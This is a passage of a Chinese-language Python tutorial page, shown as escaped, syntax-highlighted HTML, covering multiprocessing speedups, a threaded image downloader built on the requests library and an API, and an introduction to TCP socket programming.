&lt;&#x2F;span&gt;&lt;span&gt;    button1=tkinter.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Button&lt;&#x2F;span&gt;&lt;span&gt;(a,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;text&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;下载&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;command&lt;&#x2F;span&gt;&lt;span&gt;=download)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    button1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;side&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;left&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    button2=tkinter.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Button&lt;&#x2F;span&gt;&lt;span&gt;(a,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;text&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;关于&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;command&lt;&#x2F;span&gt;&lt;span&gt;=show_about)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    button2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;side&lt;&#x2F;span&gt;&lt;span&gt;=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;right&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    tkinter.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;mainloop&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;使用多进程处理复杂的任务&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;time &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;time&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    total=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    number_list=[x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100000001&lt;&#x2F;span&gt;&lt;span&gt;)]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    start=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;number_list:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        total+=number&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(total)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    end=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;总共花费了&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%.2f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;秒&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(end-start))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;接下来把生成列表的任务放到8个进程中处理，不考虑列表切片的时间&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;time &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;time&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;random &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;multiprocessing &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Process,Queue&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;task&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curr_lsit&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;result_queue&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    total=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;curr_lsit:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        total+=number&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    result_queue.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;put&lt;&#x2F;span&gt;&lt;span&gt;(total)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    processes=[]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    number_list=[x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100000001&lt;&#x2F;span&gt;&lt;span&gt;)]&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    result_queue=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Queue&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    index=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#启动8个进程将数据切片后进行计算&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        p=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Process&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;target&lt;&#x2F;span&gt;&lt;span&gt;=task,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;args&lt;&#x2F;span&gt;&lt;span&gt;=(number_list[index:index+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;12500000&lt;&#x2F;span&gt;&lt;span&gt;],result_queue))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        index+=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;12500000&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        processes.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(p)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        p.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#统计所有进程执行完成花费的时间&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    start=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;processes:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        p.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    total=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;not result_queue.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;empty&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        total+=result_queue.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(total)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    end=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;time&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;总共花费了&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%.2f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;秒&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(end-start))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;使用多进程可以充分利用CPU多核的特性，减少程序的执行时间，计算量越大效果越明显。&lt;&#x2F;p&gt;
&lt;p&gt;如果计算量超大，可以考虑分布式进程（将多个进程部署在多个计算机上面）&lt;&#x2F;p&gt;
&lt;p&gt;Python网络编程入门和网络应用开发&lt;&#x2F;p&gt;
&lt;p&gt;requests库&lt;&#x2F;p&gt;
&lt;p&gt;是一个基于HTTP协议来使用网络的第三方库。&lt;&#x2F;p&gt;
&lt;p&gt;通过pip3 list来查看有没有安装该库，如果没有通过命令&lt;&#x2F;p&gt;
&lt;p&gt;pip3 intall requests 来进行安装&lt;&#x2F;p&gt;
&lt;p&gt;例子：通过调用API来进行图片下载&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;time &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;time&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;threading &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Thread&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;DownloadTask&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Thread&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;url&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;super&lt;&#x2F;span&gt;&lt;span&gt;().&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.url=url&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        filename=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.url[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.url.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;rfind&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;:]  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#用来获取图片的文件名&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        resp=requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.url)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;Users&#x2F;Hao&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;+filename,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;wb&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;f:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(resp.content)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    resp=requests.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;api.tianapi.com&#x2F;guonei&#x2F;index?key=xxx&amp;amp;num=10&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    data_model=resp.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;json&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;data_model[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;newslist&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        url=i[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;picUrl&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;]  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#拿到图片的URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;DownloadTask&lt;&#x2F;span&gt;&lt;span&gt;(url).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#交给多线程类进行下载&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__==&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;网络应用模式&lt;&#x2F;p&gt;
&lt;p&gt;C&#x2F;S B&#x2F;S &lt;&#x2F;p&gt;
&lt;p&gt;去中心化的网络应用模式&lt;&#x2F;p&gt;
&lt;p&gt;基于传输层协议的套接字编程&lt;&#x2F;p&gt;
&lt;p&gt;套接字就是一套通过c语言编写的应用程序开发库，用于实现进程间通信和网络编程，在网络应用开发中被广泛使用。&lt;&#x2F;p&gt;
&lt;p&gt;TCP套接字&lt;&#x2F;p&gt;
&lt;p&gt;就是使用tcp协议提供的传输服务来实现网络通信的接口&lt;&#x2F;p&gt;
&lt;p&gt;在Python中通创建socket对象并指定type为SOCK_STREAM来使用tcp套接字。&lt;&#x2F;p&gt;
&lt;p&gt;由于一台主机可能拥有多个ip地址，而且很可能配置了多个服务，所以在设置服务端程序的时候，需要在创建套接字对象后将其绑定到指定的IP地址和端口上。&lt;&#x2F;p&gt;
&lt;p&gt;例子：提供时间日期服务&lt;&#x2F;p&gt;
